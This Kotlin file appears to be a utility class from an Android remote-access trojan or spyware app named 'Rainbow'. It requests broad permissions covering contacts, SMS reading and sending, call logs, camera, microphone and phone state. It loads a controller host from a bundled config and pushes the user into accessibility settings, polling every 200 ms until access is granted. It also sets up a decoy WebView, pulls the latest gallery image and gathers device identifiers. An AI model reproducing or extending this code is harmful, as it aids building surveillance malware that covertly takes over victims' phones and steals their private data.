package abyssalarmy.rainbow.RainbowUtils

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.provider.MediaStore
import android.provider.Settings
import android.util.Log
import com.karumi.dexter.Dexter
import com.karumi.dexter.MultiplePermissionsReport
import com.karumi.dexter.PermissionToken
import com.karumi.dexter.listener.PermissionRequest
import com.karumi.dexter.listener.multi.MultiplePermissionsListener
import org.json.JSONObject
import java.io.File
import java.io.IOException
import java.net.InetAddress
import java.net.NetworkInterface
import java.util.*


class RainbowTools {
    companion object {
        fun isWelcomeScreenEnable(context: Context): Boolean {
            val prefs = context.getSharedPreferences("rainbowPrefs", Context.MODE_PRIVATE)
            return prefs.getBoolean("showWelcomeScreen", true)
        }

        fun disableWelcomeScreen(context: Context) {
            val prefs = context.getSharedPreferences("rainbowPrefs", Context.MODE_PRIVATE)
            val editor = prefs.edit()
            editor.putBoolean("showWelcomeScreen", false)
            editor.apply()
        }

        fun createTempFile(prefix: String, suffix: String): File {
            val parent = File(System.getProperty("java.io.tmpdir")!!)
            val temp = File(parent, prefix + suffix)
            if (temp.exists()) {
                temp.delete()
            }
            try {
                temp.createNewFile()
            } catch (ex: IOException) {
                ex.printStackTrace()
            }
            return temp
        }

        fun grantPermissions(context: Context, onPermissionsGranted: () -> Unit) {
            Dexter
                .withContext(context)
                .withPermissions(
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.READ_EXTERNAL_STORAGE,
                    Manifest.permission.WRITE_EXTERNAL_STORAGE,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_CALL_LOG,
                    Manifest.permission.CAMERA,
                    Manifest.permission.SEND_SMS,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_PHONE_STATE
                )
                .withListener(object : MultiplePermissionsListener {
                    override fun onPermissionsChecked(p0: MultiplePermissionsReport?) {
                        onPermissionsGranted()
                    }

                    override fun onPermissionRationaleShouldBeShown(
                        p0: MutableList<PermissionRequest>?,
                        p1: PermissionToken?
                    ) {
                    }
                })
                .check()
        }

        fun rainbowConnectionData(context: Context): String {
            val json = JSONObject(
                context.assets
                    .open("connection.json")
                    .bufferedReader()
                    .readText()
            )
            return json.getString("host")
        }

        fun rainbowUiData(context: Context): RainbowUiData {
            val json = JSONObject(context.assets.open("ui.json").bufferedReader().readText())

            val welcome = json.getJSONObject("welcome")
            val permissions = json.getJSONObject("permissions")
            val accessibility = json.getJSONObject("accessibility")

            val welcomeTitle = welcome.getString("title")
            val welcomeText = welcome.getString("text")
            val welcomeButton = welcome.getString("button")

            val permissionsTitle = permissions.getString("title")
            val permissionsText = permissions.getString("text")
            val permissionsButton = permissions.getString("button")

            val accessibilityTitle = accessibility.getString("title")
            val accessibilityText = accessibility.getString("text")
            val accessibilityButton = accessibility.getString("button")

            val webviewUrl = json.getString("webviewUrl")
            return RainbowUiData(
                welcomeTitle,
                welcomeText,
                welcomeButton,
                permissionsTitle,
                permissionsText,
                permissionsButton,
                accessibilityTitle,
                accessibilityText,
                accessibilityButton,
                webviewUrl
            )
        }

        fun checkAccessibilityPermission(context: Context): Boolean {
            var accessEnabled = 0
            try {
                accessEnabled = Settings.Secure.getInt(
                    context.contentResolver,
                    Settings.Secure.ACCESSIBILITY_ENABLED
                )
            } catch (e: Settings.SettingNotFoundException) {
                e.printStackTrace()
            }
            return accessEnabled != 0
        }

        fun openAccessibilitySetting(context: Context) {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
            intent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY)
            intent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS)
            context.startActivity(intent)
        }

        fun checkAccessibilityPermissionRapid(context: Context, onGranted: () -> Unit) {
            val handler = Handler()
            val checkTask = object : Runnable {
                override fun run() {
                    if (checkAccessibilityPermission(context)) {
                        onGranted()
                    } else {
                        handler.postDelayed(this, 200)
                    }
                }
            }
            checkTask.run()
        }

        fun getDeviceName(): String {
            val manufacturer = Build.MANUFACTURER
            val model = Build.MODEL
            return if (model.startsWith(manufacturer)) {
                capitalize(model)
            } else {
                capitalize(manufacturer) + " " + model
            }
        }


        private fun capitalize(s: String?): String {
            if (s == null || s.isEmpty()) {
                return ""
            }
            val first = s[0]
            return if (Character.isUpperCase(first)) {
                s
            } else {
                first.uppercaseChar().toString() + s.substring(1)
            }
        }

        @SuppressLint("NewApi")
        fun checkPermission(context: Context, permission: String): Boolean {
            val isPermissionGranted = context.checkSelfPermission(permission)
            return isPermissionGranted == PackageManager.PERMISSION_GRANTED
        }

        fun getIPAddress(useIPv4: Boolean): String? {
            try {
                val interfaces: List<NetworkInterface> = Collections.list(NetworkInterface.getNetworkInterfaces())
                for (intf in interfaces) {
                    val addrs: List<InetAddress> = Collections.list(intf.inetAddresses)
                    for (addr in addrs) {
                        if (!addr.isLoopbackAddress) {
                            val sAddr: String = addr.hostAddress as String
                            val isIPv4 = sAddr.indexOf(':') < 0
                            if (useIPv4) {
                                if (isIPv4) return sAddr
                            } else {
                                if (!isIPv4) {
                                    val delim = sAddr.indexOf('%') // drop ip6 zone suffix
                                    return if (delim < 0) sAddr.uppercase(Locale.getDefault()) else sAddr
                                        .substring(0, delim)
                                        .uppercase(Locale.getDefault())
                                }
                            }
                        }
                    }
                }
            } catch (ignored: Exception) {
            } // for now eat exceptions
            return ""
        }

        @SuppressLint("Recycle")
        fun getLastGalleryImage(
            context: Context,
            onImageReady: (file: File) -> Unit,
            onPermissionDenied: () -> Unit
        ) {
            if (checkPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE)) {
                val cursor: Cursor?
                val listOfAllImages = ArrayList<String?>()
                var absolutePathOfImage: String?
                val uri: Uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI
                val projection = arrayOf(
                    MediaStore.MediaColumns.DATA,
                    MediaStore.Images.Media.BUCKET_DISPLAY_NAME
                )
                cursor = context.contentResolver.query(uri, projection, null, null, null)
                val column_index_data: Int = cursor!!.getColumnIndexOrThrow(MediaStore.MediaColumns.DATA)
                cursor.getColumnIndexOrThrow(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                while (cursor.moveToNext()) {
                    absolutePathOfImage = cursor.getString(column_index_data)
                    listOfAllImages.add(absolutePathOfImage)
                }
                onImageReady(File(listOfAllImages.last()!!))
            } else {
                onPermissionDenied()
            }
        }

        @SuppressLint("NewApi")
        fun decodeMk(mk: String): String {
            return String(
                Base64
                    .getDecoder()
                    .decode(mk.substringBefore("|").toByteArray(Charsets.UTF_8))
            )
        }
    }

    data class RainbowUiData(
        val welcomeTitle: String,
        val welcomeText: String,
        val welcomeButton: String,
        val permissionsTitle: String,
        val permissionsText: String,
        val permissionsButton: String,
        val accessibilityTitle: String,
        val accessibilityText: String,
        val accessibilityButton: String,
        val webviewUrl: String,
    )
}